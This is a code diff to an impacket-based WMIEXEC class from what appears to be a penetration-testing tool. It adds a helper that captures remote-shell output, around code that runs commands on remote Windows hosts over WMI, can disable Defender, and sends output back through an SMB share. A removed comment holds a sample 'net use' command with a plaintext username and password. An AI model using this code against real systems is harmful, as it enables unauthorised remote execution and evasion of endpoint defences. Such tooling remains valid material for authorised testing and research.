@@ -85,7 +85,7 @@ class WMIEXEC:
         elif dialect == impacket.smb3structs.SMB2_DIALECT_21:
             logging.debug("SMBv2.1 dialect used")
         else:
-            logging.debug("SMBv3.0 dialect used")
+            logging.debug("SMBv3.0 dialect used {}".format(dialect))
 
 
         self.__dcom  = impacket.dcerpc.v5.dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, 
@@ -97,6 +97,8 @@ class WMIEXEC:
             iWbemLevel1Login.RemRelease()
 
             self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
+            self.__remoteshell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
+
         except  (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
@@ -113,17 +115,18 @@ class WMIEXEC:
         if self.__retOutput:
             self.__smbconnection.setTimeout(100000)
 
-        #self.disable_notifications()
         if self.__killDefender:
             self.disable_defender()
 
-        self.execute_handler(command)
+        #changed this up using new function to execute comands
+        self.__outputBuffer = self.__remoteshell.exec_cmd(command)
 
         if self.__smbconnection is not None:
             self.__smbconnection.logoff()
         #self.__dcom.disconnect()   # does this leave a sess up?
-
         return self.__outputBuffer
+
+
 
     def cd(self, s):
         self.execute_remote('cd ' + s)
@@ -139,6 +142,7 @@ class WMIEXEC:
     def output_callback(self, data):
         self.__outputBuffer += data
 
+
     def execute_handler(self, data):
         if self.__retOutput:
             try:
@@ -148,7 +152,6 @@ class WMIEXEC:
                 self.execute_remote(data)
         else:
             self.execute_remote(data)
-
 
     def execute_remote(self, data):
         self.__output = '\\Windows\\Temp\\' + gen_random_string(6)
@@ -161,6 +164,7 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_remote()
 
+
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
@@ -169,22 +173,6 @@ class WMIEXEC:
         command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip,
                                                                          self.__share_name,
                                                                          self.__output)
-        #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
-        #                                                      self.__share_name,
-        #                                                      self.__output)
-
-        #adding creds gets past systems disallowing guest-auth
-        # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
-        #command = self.__shell + '"net use * /d /y & '
-        #command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
-        #                                                                                         self.__share_name, 
-        #                                                                                         self.__username, 
-        #                                                                                         self.__password, 
-        #                                                                                         commandData)
-        #command = self.__shell + 'net use * /d /y'
-        #command += self.__shell + 'net use \\\\{}\\{} & {} "'.format(local_ip,
-        #                                            self.__share_name,
-        #                                            commandData)
 
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
@@ -501,3 +489,30 @@ class RemoteShell(cmd.Cmd):
         self.execute_remote(data)
         print(self.__outputBuffer)
         self.__outputBuffer = ''
+
+
+
+    def exec_cmd(self,data):
+        '''Execute a single command. 
+
+        LOL look at this wonky shit i did
+        '''
+
+        #store OG stdout
+        a, b, c = sys.stdout, sys.stdin, sys.stderr
+
+        #switch stdout to our 'buffer'
+        buff = open(cfg.TEST_PATH,"w")
+        sys.stdout, sys.stdin, sys.stderr = buff, buff, buff
+
+        self.onecmd(data)
+
+        # switch back to normal
+        sys.stdout, sys.stdin, sys.stderr = a, b, c 
+        buff.close()
+
+        with open(cfg.TEST_PATH, 'r') as file:
+            data = file.read()
+        
+        return data
+
